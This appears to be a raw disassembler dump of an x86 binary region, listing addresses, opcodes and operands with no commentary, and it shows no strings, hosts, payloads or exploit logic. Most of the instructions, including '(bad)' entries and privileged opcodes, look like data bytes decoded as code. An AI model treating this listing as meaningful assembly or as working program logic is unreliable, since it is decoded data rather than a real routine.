  403965:	add    BYTE PTR [ebx+0x120c780c],ah
  40396b:	add    BYTE PTR [edx+0x60c780c],dh
  403971:	add    ah,ch
  403973:	or     al,0xae
  403975:	add    DWORD PTR [esi],ecx
  403977:	add    BYTE PTR [ebp+ecx*1+0x60d67],al
  40397e:	add    DWORD PTR [esi],ecx
  403980:	cmc    
  403981:	or     eax,0xe140006
  403986:	or     cl,BYTE PTR [esi]
  403988:	push   es
  403989:	add    BYTE PTR [ebp+0xf],ah
  40398c:	lock pop es
  40398e:	push   es
  40398f:	add    al,bh
  403991:	fxsave [ecx]
  403994:	push   es
  403995:	add    dh,bl
  403997:	adc    BYTE PTR [edi-0x15fff9f0],bh
  40399d:	adc    bh,BYTE PTR [edi+0x10000610]
  4039a3:	adc    edi,esi
  4039a5:	adc    al,BYTE PTR [esi]
  4039a7:	add    BYTE PTR [ecx],ch
  4039a9:	adc    edi,esi
  4039ab:	adc    al,BYTE PTR [esi]
  4039ad:	add    BYTE PTR [edx+0x13],al
  4039b0:	(bad)  
  4039b1:	adc    al,BYTE PTR [esi]
  4039b3:	add    BYTE PTR [ebp+0x13],bl
  4039b6:	(bad)  
  4039b7:	adc    al,BYTE PTR [esi]
  4039b9:	add    BYTE PTR [esi+0x13],dh
  4039bc:	(bad)  
  4039bd:	adc    al,BYTE PTR [esi]
  4039bf:	add    BYTE PTR [ebx+0x612fe13],dl
  4039c5:	add    BYTE PTR [ecx+0x612fe13],bh
  4039cb:	add    dl,dl
  4039cd:	adc    edi,esi
  4039cf:	adc    al,BYTE PTR [esi]
  4039d1:	add    ch,ch
  4039d3:	adc    edi,esi
  4039d5:	adc    al,BYTE PTR [esi]
  4039d7:	add    BYTE PTR [esp+edx*1],al
  4039da:	(bad)  
  4039db:	adc    al,BYTE PTR [esi]
  4039dd:	add    BYTE PTR [ecx],ah
  4039df:	adc    al,0xfe
  4039e1:	adc    al,BYTE PTR [esi]
  4039e3:	add    BYTE PTR [edi+0x14],cl
  4039e6:	cmp    al,0x14
  4039e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e9:	add    BYTE PTR [ebx+0x14],ah
  4039ec:	add    BYTE PTR [eax],al
  4039ee:	push   es
  4039ef:	add    BYTE PTR [edx+0x6147214],dl
  4039f5:	add    BYTE PTR [edx+0x6147214],dh
  4039fb:	add    al,dl
  4039fd:	adc    al,0xae
  4039ff:	add    DWORD PTR [esi],eax
  403a01:	add    dl,ah
  403a03:	adc    al,0xa
  403a05:	push   cs
  403a06:	push   es
  403a07:	add    BYTE PTR [eax],al
  403a09:	adc    eax,0x601ae
  403a0e:	push   ss
  403a0f:	adc    eax,0x601ae
  403a14:	push   ds
  403a15:	adc    eax,0x601ae
  403a1a:	cmp    dl,BYTE PTR ds:0x601ae
  403a20:	jbe    0x403a37
  403a22:	scas   al,BYTE PTR es:[edi]
  403a23:	add    DWORD PTR [esi],eax
  403a25:	add    BYTE PTR [esi+0x601ae15],al
  403a2b:	add    BYTE PTR [eax+0x601ae15],ch
  403a31:	add    dh,al
  403a33:	adc    eax,0x601ae
  403a38:	retf   
  403a39:	adc    eax,0x601ae
  403a3e:	out    dx,eax
  403a3f:	adc    eax,0x612fe
  403a44:	add    DWORD PTR [esi],edx
  403a46:	(bad)  
  403a47:	adc    dl,BYTE PTR [esi]
  403a49:	add    BYTE PTR [esi+edx*1+0x3c],bl
  403a4d:	push   ss
  403a4e:	or     al,BYTE PTR [eax]
  403a50:	xchg   ebx,eax
  403a51:	push   ss
  403a52:	push   edi
  403a53:	or     DWORD PTR [esi],edx
  403a55:	add    BYTE PTR [edx+0x1a163c16],dh
  403a5b:	add    bl,bh
  403a5d:	push   ss
  403a5e:	cmp    al,0x14
  403a60:	push   ss
  403a61:	add    BYTE PTR [edi+edx*1],bl
  403a64:	cmp    al,0x16
  403a66:	sbb    al,BYTE PTR [eax]
  403a68:	pop    eax
  403a69:	pop    ss
  403a6a:	scas   al,BYTE PTR es:[edi]
  403a6b:	add    DWORD PTR [edx],ebx
  403a6d:	add    BYTE PTR [edi+edx*1-0x52],bl
  403a71:	add    DWORD PTR [edx],ecx
  403a73:	add    BYTE PTR [edi+edx*1-0x3f],ah
  403a77:	add    DWORD PTR [esi],edx
  403a79:	add    BYTE PTR [eax+0x17],bh
  403a7c:	cmp    al,0x16
  403a7e:	or     al,BYTE PTR [eax]
  403a80:	scas   eax,DWORD PTR es:[edi]
  403a81:	pop    ss
  403a82:	push   edi
  403a83:	or     DWORD PTR [edx],ecx
  403a85:	add    ch,dh
  403a87:	pop    ss
  403a88:	ficom  DWORD PTR [edi]
  403a8a:	push   ss
  403a8b:	add    BYTE PTR [edi+0x18],dl
  403a8e:	cmp    al,0x16
  403a90:	push   es
  403a91:	add    BYTE PTR [esi+0x18],bh
  403a94:	lock pop es
  403a96:	sbb    al,BYTE PTR [eax]
  403a98:	lahf   
  403a99:	sbb    al,dh
  403a9b:	pop    es
  403a9c:	push   es
  403a9d:	add    ah,al
  403a9f:	sbb    al,dh
  403aa1:	pop    es
  403aa2:	or     al,BYTE PTR [eax]
  403aa4:	fcomp  DWORD PTR [eax]
  403aa6:	push   es
  403aa7:	add    cl,BYTE PTR [edx]
  403aa9:	add    BYTE PTR [ebx],cl
  403aab:	sbb    edx,ebx
  403aad:	pop    ss
  403aae:	or     al,BYTE PTR [eax]
  403ab0:	and    al,0x19
  403ab2:	push   es
  403ab3:	add    al,BYTE PTR [esi]
  403ab5:	add    BYTE PTR [edx],bh
  403ab7:	sbb    edx,ebx
  403ab9:	pop    ss
  403aba:	or     al,BYTE PTR [eax]
  403abc:	bound  ebx,QWORD PTR [ecx]
  403abe:	push   es
  403abf:	add    cl,BYTE PTR [edx]
  403ac1:	add    BYTE PTR [ecx+ebx*1+0x6],dh
  403ac5:	add    cl,BYTE PTR [edx]
  403ac7:	add    BYTE PTR [ebp+0x6020619],dl
  403acd:	add    dl,ah
  403acf:	sbb    edi,ecx
  403ad1:	sbb    DWORD PTR [edx],ecx
  403ad3:	add    bh,dh
  403ad5:	sbb    ecx,eax
  403ad7:	add    DWORD PTR [edx],ecx
  403ad9:	add    BYTE PTR [eax],cl
  403adb:	sbb    al,cl
  403add:	add    DWORD PTR [esi],eax
  403adf:	add    BYTE PTR [edx+ebx*1+0x3a],dl
  403ae3:	sbb    al,BYTE PTR [esi]
  403ae5:	add    BYTE PTR [edx+0x1a],dh
  403ae8:	cmp    bl,BYTE PTR [edx]
  403aea:	or     al,BYTE PTR [eax]
  403aec:	fwait
  403aed:	sbb    al,cl
  403aef:	add    DWORD PTR [edx],ecx
  403af1:	add    BYTE PTR [edx+ebx*1+0x1e01c1],dh
  403af8:	sbb    edx,DWORD PTR ds:[esi]
  403afb:	sbb    edx,DWORD PTR [esi]
  403afd:	add    ch,dl
  403aff:	sbb    edi,DWORD PTR [esi+edx*1]
  403b02:	push   es
  403b03:	add    BYTE PTR [ebx],bl
  403b05:	sbb    al,0xae
  403b07:	add    DWORD PTR [esi],edx
  403b09:	add    BYTE PTR ds:0xa163c1d,al
  403b0f:	add    BYTE PTR ds:0x601c11d,bl
  403b15:	add    BYTE PTR [ebp+ebx*1+0x72],cl
  403b19:	adc    al,0xa
  403b1b:	add    BYTE PTR [ebp+ebx*1-0x3f],dh
  403b1f:	add    DWORD PTR [esi],eax
  403b21:	add    BYTE PTR [ebp+0x601ae1d],cl
  403b27:	add    BYTE PTR [esi+0x1207f01d],bl
  403b2d:	add    ch,dh
  403b2f:	sbb    eax,0xe1dc8
  403b34:	sbb    BYTE PTR [esi],bl
  403b36:	imul   eax,DWORD PTR [edx],0x1e250187
  403b3c:	add    BYTE PTR [eax],al
  403b3e:	push   es
  403b3f:	add    BYTE PTR [edi+0x1e],ch
  403b42:	lock pop es
  403b44:	push   ss
  403b45:	add    BYTE PTR [esi+0x61e7d1e],bl
  403b4b:	add    al,cl
  403b4d:	push   ds
  403b4e:	scas   al,BYTE PTR es:[edi]
  403b4f:	add    DWORD PTR [edx],ecx
  403b51:	add    cl,dh
  403b53:	push   ds
  403b54:	rol    DWORD PTR [ecx],0x6
  403b57:	add    BYTE PTR [ecx],al
  403b59:	pop    ds
  403b5a:	scas   al,BYTE PTR es:[edi]
  403b5b:	add    DWORD PTR [esi],ecx
  403b5d:	add    BYTE PTR [esi+0x1f],bl
  403b60:	imul   eax,DWORD PTR [edx],0x1f8c000e
  403b66:	imul   eax,DWORD PTR [edx],0x1fcc000e
  403b6c:	addr16 or eax,0x2005000e
  403b72:	imul   eax,DWORD PTR [edx],0x20340012
  403b78:	enter  0x61d,0x0
  403b7c:	inc    ecx
  403b7d:	and    dl,bl
  403b7f:	pop    ss
  403b80:	adc    al,BYTE PTR [eax]
  403b82:	dec    eax
  403b83:	and    al,cl
  403b85:	sbb    eax,0x20600006
  403b8a:	ficom  DWORD PTR [edi]
  403b8c:	push   cs
  403b8d:	add    BYTE PTR [esi+0x20],ch
  403b90:	imul   eax,DWORD PTR [edx],0x20a9001a
  403b96:	mov    ah,BYTE PTR [eax]
  403b98:	adc    al,BYTE PTR [eax]
  403b9a:	mov    ebp,0x1e0c7820
  403b9f:	add    al,bl
  403ba1:	and    BYTE PTR [esi],dl
  403ba3:	sbb    eax,DWORD PTR [esi]
  403ba5:	add    BYTE PTR [esi],bh
  403ba7:	(bad)  
  403ba9:	push   cs
  403baa:	and    al,BYTE PTR [eax]
  403bac:	inc    edi
  403bad:	and    DWORD PTR [eax],esp
  403baf:	and    DWORD PTR [edx],esp
  403bb1:	add    BYTE PTR [edx+0x21],bh
  403bb4:	and    BYTE PTR [ecx],ah
  403bb6:	adc    al,BYTE PTR [eax]
  403bb8:	xchg   edx,eax
  403bb9:	and    eax,ecx
  403bbb:	sbb    eax,0x21a80006
  403bc0:	iret   
  403bc1:	sbb    DWORD PTR [edx],edx
  403bc3:	add    al,ch
  403bc5:	and    DWORD PTR [ecx+eiz*1+0x22440006],esi
  403bcc:	scas   al,BYTE PTR es:[edi]
  403bcd:	add    DWORD PTR [esi],eax
  403bcf:	add    BYTE PTR [edx+eiz*1-0x52],dl
  403bd3:	add    DWORD PTR [esi],eax
  403bd5:	add    al,al
  403bd7:	and    dh,al
  403bd9:	pop    es
  403bda:	push   es
  403bdb:	add    ch,dl
  403bdd:	and    dh,al
  403bdf:	pop    es
  403be0:	push   es
  403be1:	add    cl,ah
  403be3:	and    ch,BYTE PTR [esi+0x1]
  403be9:	add    BYTE PTR [ecx],al
  403beb:	add    BYTE PTR [eax],al
  403bed:	add    BYTE PTR [eax],al
  403bef:	add    BYTE PTR [ecx],al
  403bf1:	add    BYTE PTR [ecx],al
  403bf3:	add    BYTE PTR [eax+0x27001001],al
  403bf9:	add    BYTE PTR [eax],al
  403bfb:	add    BYTE PTR ds:0x1000100,al
  403c01:	add    BYTE PTR [eax+0x3b001001],al
  403c07:	add    BYTE PTR [esi+0x0],cl
  403c0a:	add    eax,0x2002000
  403c0f:	add    BYTE PTR [eax+0x6a001000],al
  403c15:	add    BYTE PTR [esi+0x0],cl
  403c18:	add    eax,0x2002800
  403c1d:	add    BYTE PTR [ecx+eax*1],al
  403c20:	add    BYTE PTR [eax],al
  403c22:	jbe    0x403c24
  403c24:	add    BYTE PTR [eax],al
  403c26:	or     DWORD PTR [eax],eax
  403c28:	sub    al,BYTE PTR [eax]
  403c2a:	or     eax,0x10000000
  403c2f:	add    BYTE PTR [eax+0x5004e00],cl
  403c35:	add    BYTE PTR [edi],ch
  403c37:	add    BYTE PTR ds:0x10000500,cl
  403c3d:	add    BYTE PTR [ebx+0x5000000],bl
  403c43:	add    BYTE PTR [edi],ch
  403c45:	add    BYTE PTR [eax+eax*1],dl
  403c48:	add    BYTE PTR [eax],al
  403c4a:	adc    BYTE PTR [eax],al
  403c4c:	mov    al,ds:0x1000b000
  403c51:	add    BYTE PTR ds:0x1a00,dh
  403c57:	add    BYTE PTR [eax],dl
  403c59:	add    al,dl
  403c5b:	add    BYTE PTR [eax+0x38000500],dh
  403c61:	add    BYTE PTR [ecx],ch
  403c63:	add    BYTE PTR [ebx],al
  403c65:	add    BYTE PTR [eax],dl
  403c67:	add    cl,ch
  403c69:	add    BYTE PTR [eax],al
  403c6b:	add    BYTE PTR ds:0x2d003800,al
  403c71:	add    BYTE PTR [eax-0x5000000],ah
  403c77:	add    BYTE PTR [eax+0x38000000],dh
  403c7d:	add    BYTE PTR [eax],dh
  403c7f:	add    BYTE PTR [eax+0xa000000],ah
  403c85:	add    DWORD PTR [eax+0x38000000],esi
  403c8b:	add    BYTE PTR [ecx],dh
  403c8d:	add    BYTE PTR [eax+0x1d000000],ah
  403c93:	add    DWORD PTR [eax+0x38000000],esi
  403c99:	add    BYTE PTR [ebp+0x0],al
  403c9c:	add    BYTE PTR [eax],al
  403c9e:	adc    BYTE PTR [eax],al
  403ca0:	cmp    BYTE PTR [ecx],al
  403ca2:	mov    al,0x0
  403ca4:	add    eax,0x4d003800
  403ca9:	add    BYTE PTR [eax],al
  403cab:	add    BYTE PTR [eax],dl
  403cad:	add    BYTE PTR [ebp+0x1],cl
  403cb0:	mov    al,0x0
  403cb2:	add    eax,0x58003a00
  403cb7:	add    BYTE PTR [edx],al
  403cb9:	add    BYTE PTR [eax],dl
  403cbb:	add    BYTE PTR [ebx+0x5000000],bl
  403cc1:	add    BYTE PTR [edx],bh
  403cc3:	add    BYTE PTR [eax+eax*1+0x0],bl
  403cc7:	add    BYTE PTR [eax],dl
  403cc9:	add    BYTE PTR [eax+0x1],ah
  403ccc:	mov    al,0x0
  403cce:	add    eax,0x61003d00
  403cd3:	add    BYTE PTR [eax],al
  403cd5:	add    BYTE PTR [eax],dl
  403cd7:	add    BYTE PTR [ebp+0x1],dh
  403cda:	mov    al,0x0
  403cdc:	add    eax,0x65003e00
  403ce1:	add    BYTE PTR [ebx],al
  403ce3:	add    BYTE PTR [eax],dl
  403ce5:	add    BYTE PTR [esi+0x5000001],cl
  403ceb:	add    BYTE PTR [ebx+0x0],al
  403cee:	add    BYTE PTR [eax],0x2
  403cf1:	add    BYTE PTR [eax],dl
  403cf3:	add    BYTE PTR [ecx+0x5000001],bl
  403cf9:	add    BYTE PTR [eax+0x0],cl
  403cfc:	mov    eax,DWORD PTR [eax]
  403cfe:	add    eax,DWORD PTR [ecx]
  403d00:	adc    BYTE PTR [eax],al
  403d02:	iret   
  403d03:	sbb    al,BYTE PTR [eax]
  403d05:	add    BYTE PTR ds:0x8f004b00,al
  403d0b:	add    BYTE PTR [ebx],al
  403d0d:	add    DWORD PTR [eax],edx
  403d0f:	add    BYTE PTR [ebx+ebx*1+0x0],ah
  403d13:	add    BYTE PTR ds:0x91004e00,al
  403d19:	add    BYTE PTR [ebx],al
  403d1b:	add    DWORD PTR [eax],edx
  403d1d:	add    BYTE PTR [ebp+0x500001b],ah
  403d23:	add    BYTE PTR [edx+0x0],dl
  403d26:	xchg   ebx,eax
  403d27:	add    BYTE PTR [ebx],al
  403d29:	add    DWORD PTR [eax],edx
  403d2b:	add    bh,dh
  403d2d:	sbb    eax,DWORD PTR [eax]
  403d2f:	add    BYTE PTR ds:0x95005500,al
  403d35:	add    BYTE PTR [ebx],al
  403d37:	add    DWORD PTR [eax],edx
  403d39:	add    BYTE PTR [ecx],dh
  403d3b:	sbb    al,0x0
  403d3d:	add    BYTE PTR ds:0x97005800,al
  403d43:	add    BYTE PTR [ebx],al
  403d45:	add    DWORD PTR [eax],edx
  403d47:	add    BYTE PTR [ebp+0x500001c],al
  403d4d:	add    BYTE PTR [ebp+0x0],bl
  403d50:	cdq    
  403d51:	add    BYTE PTR [ebx],al
  403d53:	add    DWORD PTR [eax],edx
  403d55:	add    bh,cl
  403d57:	sbb    al,0x0
  403d59:	add    BYTE PTR ds:0x9b006100,al
  403d5f:	add    BYTE PTR [ebx],al
  403d61:	add    DWORD PTR [eax],edx
  403d63:	add    BYTE PTR [ebx+ebx*1+0x0],ah
  403d67:	add    BYTE PTR ds:0x9d006400,al
  403d6d:	add    BYTE PTR [ebx],al
  403d6f:	add    DWORD PTR [eax],edx
  403d71:	add    BYTE PTR [ebp+0x500001b],ah
  403d77:	add    BYTE PTR [ecx+0x0],ch
  403d7a:	lahf   
  403d7b:	add    BYTE PTR [ebx],al
  403d7d:	add    DWORD PTR [eax],edx
  403d7f:	add    bh,dh
  403d81:	sbb    eax,DWORD PTR [eax]
  403d83:	add    BYTE PTR ds:0xa1006b00,al
  403d89:	add    BYTE PTR [ebx],al
  403d8b:	add    DWORD PTR [eax],edx
  403d8d:	add    BYTE PTR [edi+0x22],ch
  403d90:	add    BYTE PTR [eax],al
  403d92:	add    eax,0xa3006d00
  403d97:	add    BYTE PTR [esi-0x80],dl
  403d9a:	xchg   edi,eax
  403d9b:	add    dl,BYTE PTR [ebx]
  403d9d:	add    BYTE PTR [esi-0x80],dl
  403da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da1:	add    ah,BYTE PTR [edi]
  403da3:	add    BYTE PTR [esi-0x80],dl
  403da6:	mov    dl,0x2
  403da8:	daa    
  403da9:	add    BYTE PTR [esi-0x80],dl
  403dac:	mov    edi,0x56002702
  403db1:	or     ah,0x2
  403db4:	daa    
  403db5:	add    BYTE PTR [esi-0x80],dl
  403db8:	aam    0x2
  403dba:	adc    eax,DWORD PTR [eax]
  403dbc:	push   esi
  403dbd:	sub    cl,0x2
  403dc0:	adc    eax,DWORD PTR [eax]
  403dc2:	push   esi
  403dc3:	cmp    bl,0x2
  403dc6:	adc    eax,DWORD PTR [eax]
  403dc8:	push   esi
  403dc9:	sbb    BYTE PTR [edi],0x3
  403dcc:	adc    eax,DWORD PTR [eax]
  403dce:	push   esi
  403dcf:	cmp    BYTE PTR [ecx],0x3
  403dd2:	adc    eax,DWORD PTR [eax]
  403dd4:	push   esi
  403dd5:	adc    BYTE PTR [edi+0x3],0x13
  403dd9:	add    BYTE PTR [esi-0x80],dl
  403ddc:	jns    0x403de1
  403dde:	adc    eax,DWORD PTR [eax]
  403de0:	push   esi
  403de1:	or     BYTE PTR [edi+0x56001303],0x80
  403de8:	lods   al,BYTE PTR ds:[esi]
  403de9:	add    edx,DWORD PTR [ebx]
  403deb:	add    BYTE PTR [esi-0x80],dl
  403dee:	lds    eax,FWORD PTR [ebx]
  403df0:	adc    eax,DWORD PTR [eax]
  403df2:	push   esi
  403df3:	sbb    dh,0x3
  403df6:	adc    eax,DWORD PTR [eax]
  403df8:	push   esi
  403df9:	xor    cl,0x3
  403dfc:	adc    eax,DWORD PTR [eax]
  403dfe:	push   esi
  403dff:	add    BYTE PTR [esp+eax*1],0x13
  403e03:	add    BYTE PTR [esi-0x80],dl
  403e06:	sbb    al,BYTE PTR [ebx+edx*1]
  403e09:	add    BYTE PTR [esi-0x80],dl
  403e0c:	das    
  403e0d:	add    al,0x13
  403e0f:	add    BYTE PTR [esi-0x80],dl
  403e12:	inc    edx
  403e13:	add    al,0x13
  403e15:	add    BYTE PTR [esi-0x80],dl
  403e18:	push   esi
  403e19:	add    al,0x13
  403e1b:	add    BYTE PTR [esi-0x80],dl
  403e1e:	imul   eax,DWORD PTR [ebx+edx*1],0x7c805600
  403e25:	add    al,0x13
  403e27:	add    BYTE PTR [esi-0x80],dl
  403e2a:	xchg   edx,eax
  403e2b:	add    al,0x85
  403e2d:	add    dl,BYTE PTR [esi-0x80]
  403e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e31:	add    al,0x85
  403e33:	add    dl,BYTE PTR [esi-0x80]
  403e36:	rol    BYTE PTR [ebx+edx*1],0x0
  403e3a:	push   esi
  403e3b:	adc    ch,0x4
  403e3e:	adc    eax,DWORD PTR [eax]
  403e40:	push   esi
  403e41:	sub    ch,0x4
  403e44:	adc    eax,DWORD PTR [eax]
  403e46:	push   esi
  403e47:	or     BYTE PTR [edx],0x5
  403e4a:	adc    eax,DWORD PTR [eax]
  403e4c:	push   esi
  403e4d:	and    BYTE PTR [ebx],0x5
  403e50:	adc    eax,DWORD PTR [eax]
  403e52:	push   ebx
  403e53:	sub    BYTE PTR [edx+0x5],0x13
  403e57:	add    BYTE PTR [ebx-0x80],dl
  403e5a:	jne    0x403e61
  403e5c:	adc    eax,DWORD PTR [eax]
  403e5e:	push   ecx
  403e5f:	add    BYTE PTR [ebp+0x51001305],0x80
  403e66:	xchg   edx,eax
  403e67:	add    eax,0x80530013
  403e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e6d:	add    eax,0x80530013
  403e72:	scas   al,BYTE PTR es:[edi]
  403e73:	add    eax,0x80530013
  403e78:	mov    ebp,0x53001305
  403e7d:	or     ch,0x5
  403e80:	adc    eax,DWORD PTR [eax]
  403e82:	add    DWORD PTR [eax],eax
  403e84:	push   edi
  403e85:	push   es
  403e86:	nop
  403e87:	or     DWORD PTR [ecx],eax
  403e89:	add    BYTE PTR [eax+0x6099c06],dl
  403e8f:	push   es
  403e90:	retf   0x2706
  403e93:	add    BYTE PTR [esi-0x80],dl
  403e96:	rol    BYTE PTR [esi],cl
  403e98:	mov    cl,0x9
  403e9a:	push   esi
  403e9b:	adc    bh,0x6
  403e9e:	mov    cl,0x9
  403ea0:	push   esi
  403ea1:	sbb    dh,0x6
  403ea4:	mov    cl,0x9
  403ea6:	push   esi
  403ea7:	and    ah,0x6
  403eaa:	mov    cl,0x9
  403eac:	push   esi
  403ead:	and    BYTE PTR [edi],0x7
  403eb0:	adc    eax,DWORD PTR [eax]
  403eb2:	push   esi
  403eb3:	add    BYTE PTR [eax+0x7],0x13
  403eb7:	add    BYTE PTR [esi-0x80],dl
  403eba:	pop    ebx
  403ebb:	pop    es
  403ebc:	adc    eax,DWORD PTR [eax]
  403ebe:	push   esi
  403ebf:	or     BYTE PTR [esi+0x11001307],0x0
  403ec6:	ret    
  403ec7:	pop    es
  403ec8:	nop
  403ec9:	or     dl,BYTE PTR [ecx]
  403ecb:	add    bl,dl
  403ecd:	pop    es
  403ece:	xchg   esp,eax
  403ecf:	or     dl,BYTE PTR [ecx]
  403ed1:	add    ch,ah
  403ed3:	pop    es
  403ed4:	lahf   
  403ed5:	or     al,BYTE PTR [ecx]
  403ed7:	add    BYTE PTR [edx],dl
  403ed9:	or     BYTE PTR [ebx+0x2200010a],ah
  403edf:	or     BYTE PTR [ebx],dl
  403ee1:	add    BYTE PTR [ecx],al
  403ee3:	add    BYTE PTR [edx],bl
  403ee5:	or     al,0x6f
  403ee7:	or     eax,DWORD PTR [ecx]
  403ee9:	add    BYTE PTR [esp+ecx*1],ch
  403eec:	jae    0x403ef9
  403eee:	push   esi
  403eef:	sbb    BYTE PTR [edx],0xd
  403ef2:	adc    eax,DWORD PTR [eax]
  403ef4:	adc    DWORD PTR [eax],eax
  403ef6:	ret    
  403ef7:	pop    es
  403ef8:	nop
  403ef9:	or     dl,BYTE PTR [ecx]
  403efb:	add    BYTE PTR [edi],ah
  403efd:	or     eax,0x10a94
  403f02:	xor    BYTE PTR ds:0x110bd7,cl
  403f08:	pop    esp
  403f09:	or     eax,0x10bdb
  403f0e:	sub    al,0xc
  403f10:	jae    0x403f1d
  403f12:	and    DWORD PTR [eax],eax
  403f14:	xchg   esp,eax
  403f15:	or     eax,0x210bde
  403f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f1b:	or     eax,0x110b6f
  403f20:	dec    eax
  403f21:	push   ds
  403f22:	pusha  
  403f23:	adc    al,BYTE PTR [ecx]
  403f25:	add    BYTE PTR [ecx+0x100130e],ah
  403f2b:	add    BYTE PTR [edi+0x100130e],dh
  403f31:	add    dh,dl
  403f33:	push   cs
  403f34:	or     DWORD PTR [ecx+eax*1],ecx
  403f37:	add    al,dh
  403f39:	push   cs
  403f3a:	adc    eax,DWORD PTR [eax]
  403f3c:	add    DWORD PTR [eax],eax
  403f3e:	or     cl,BYTE PTR [edi]
  403f40:	or     eax,0x4500010c
  403f45:	pand   mm1,QWORD PTR [ebx]
  403f48:	add    DWORD PTR [eax],eax
  403f4a:	dec    esp
  403f4b:	seto   BYTE PTR [ecx]
  403f4e:	add    DWORD PTR [eax],eax
  403f50:	ins    BYTE PTR es:[edi],dx
  403f51:	bndstx [esi+eax*1],bnd1
  403f55:	add    BYTE PTR [esi+0x6001310],cl
  403f5b:	add    dl,ah
  403f5d:	sbb    dh,cl
  403f5f:	clts   
  403f61:	add    dl,dh
  403f63:	sbb    dh,ch
  403f65:	clts   
  403f67:	add    BYTE PTR [edi+0x1b],dh
  403f6a:	adc    eax,DWORD PTR [eax]
  403f6c:	push   es
  403f6d:	add    BYTE PTR [ebp+0x60ff11b],al
  403f73:	add    dl,dh
  403f75:	sbb    dh,ch
  403f77:	clts   
  403f79:	add    ch,dl
  403f7b:	adc    DWORD PTR [ebx],edx
  403f7d:	add    BYTE PTR [esi],al
  403f7f:	add    BYTE PTR [eax+0x60ff11b],bh
  403f85:	add    dl,dh
  403f87:	sbb    dh,ch
  403f89:	clts   
  403f8b:	add    dl,ah
  403f8d:	adc    DWORD PTR [ebx],edx
  403f8f:	add    BYTE PTR [esi],al
  403f91:	add    BYTE PTR [eax+0x60ff11b],bh
  403f97:	add    dl,dh
  403f99:	sbb    dh,ch
  403f9b:	clts   
  403f9d:	add    cl,dh
  403f9f:	adc    DWORD PTR [ebx],edx
  403fa1:	add    BYTE PTR [esi],al
  403fa3:	add    BYTE PTR [esp+ebx*1+0x13],al
  403fa7:	add    BYTE PTR [esi],al
  403fa9:	add    BYTE PTR [edx+0x1c],dl
  403fac:	adc    eax,DWORD PTR [eax]
  403fae:	push   es
  403faf:	add    dl,dh
  403fb1:	sbb    dh,ch
  403fb3:	clts   
  403fb5:	add    BYTE PTR [edi+0x12],dh
  403fb8:	sbb    dl,BYTE PTR [eax]
  403fba:	push   es
  403fbb:	add    ch,bh
  403fbd:	adc    DWORD PTR [ebx],edx
  403fbf:	add    BYTE PTR [esi],al
  403fc1:	add    BYTE PTR [ecx+0x609901c],bl
  403fc7:	add    BYTE PTR [edx+0x600131c],ch
  403fcd:	add    dl,dh
  403fcf:	sbb    dh,ch
  403fd1:	clts   
  403fd3:	add    BYTE PTR [edi+0x12],dh
  403fd6:	sbb    dl,BYTE PTR [eax]
  403fd8:	push   es
  403fd9:	add    dl,dh
  403fdb:	sbb    dh,ch
  403fdd:	clts   
  403fdf:	add    BYTE PTR [edi+0x12],dh
  403fe2:	sbb    dl,BYTE PTR [eax]
  403fe4:	push   es
  403fe5:	add    BYTE PTR [esi],bl
  403fe7:	adc    dl,BYTE PTR [eax-0x11fff9f7]
  403fed:	and    cl,dh
  403fef:	clts   
  403ff1:	add    dl,dh
  403ff3:	sbb    bh,BYTE PTR [esi]
  403ff5:	adc    eax,DWORD PTR [esi]
  403ff7:	add    bh,dh
  403ff9:	adc    BYTE PTR [ebx],dl
  403ffb:	add    BYTE PTR [esi],al
  403ffd:	add    dh,bh
  403fff:	adc    BYTE PTR [ebx],dl
  404001:	add    BYTE PTR [esi],al
  404003:	add    BYTE PTR [ecx],cl
  404005:	adc    DWORD PTR [ebx],edx
  404007:	add    BYTE PTR [esi],al
  404009:	add    BYTE PTR [ecx],cl
  40400b:	and    DWORD PTR [edi+0x13],eax
  40400e:	push   es
  40400f:	add    dl,dh
  404011:	sbb    bh,BYTE PTR [esi]
  404013:	adc    eax,DWORD PTR [esi]
  404015:	add    dl,dh
  404017:	sbb    bh,BYTE PTR [esi]
  404019:	adc    eax,DWORD PTR [esi]
  40401b:	add    BYTE PTR [ecx+0x6134712],ah
  404021:	add    BYTE PTR [ebx+0x613c822],al
  404027:	add    bh,cl
  404029:	adc    dl,bh
  40402b:	or     edx,eax
  40402d:	and    BYTE PTR [eax],al
  40402f:	add    BYTE PTR [eax],al
  404031:	add    BYTE PTR [esi-0x6efac3f8],dl
  404037:	add    eax,DWORD PTR [ecx]
  404039:	add    al,bl
  40403b:	and    BYTE PTR [eax],al
  40403d:	add    BYTE PTR [eax],al
  40403f:	add    BYTE PTR [eax+eax*1+0x96905df],dl
  404046:	add    DWORD PTR [eax],eax
  404048:	push   esp
  404049:	and    DWORD PTR [eax],eax
  40404b:	add    BYTE PTR [eax],al
  40404d:	add    BYTE PTR [eax+ebx*1+0x97105ef],al
  404054:	add    eax,DWORD PTR [eax]
  404056:	mov    WORD PTR [ecx],fs
  404058:	add    BYTE PTR [eax],al
  40405a:	add    BYTE PTR [eax],al
  40405c:	add    DWORD PTR [eax],0x97505f5
  404062:	add    eax,DWORD PTR [eax]
  404064:	cmp    BYTE PTR [ebx],ah
  404066:	add    BYTE PTR [eax],al
  404068:	add    BYTE PTR [eax],al
  40406a:	test   BYTE PTR [eax],al
  40406c:	push   es
  40406d:	push   es
  40406e:	jnp    0x404079
  404070:	add    al,0x0
  404072:	add    BYTE PTR [eax],al
  404074:	add    BYTE PTR [eax],al
  404076:	add    BYTE PTR [eax],al
  404078:	les    eax,FWORD PTR ds:0x971061e
  40407e:	push   es
  40407f:	add    BYTE PTR [eax],al
  404081:	add    BYTE PTR [eax],al
  404083:	add    BYTE PTR [eax],al
  404085:	add    ah,al
  404087:	add    eax,0x9820632
  40408c:	push   es
  40408d:	add    BYTE PTR [eax],al
  40408f:	add    BYTE PTR [eax],al
  404091:	add    BYTE PTR [eax],al
  404093:	add    ah,al
  404095:	add    eax,0x986063f
  40409a:	push   es
  40409b:	add    BYTE PTR [eax],al
  40409d:	add    BYTE PTR [eax],al
  40409f:	add    BYTE PTR [eax],al
  4040a1:	add    ah,al
  4040a3:	or     eax,0x98c064d
  4040a8:	or     BYTE PTR [eax],al
  4040aa:	jle    0x4040cf
  4040ac:	add    BYTE PTR [eax],al
  4040ae:	add    BYTE PTR [eax],al
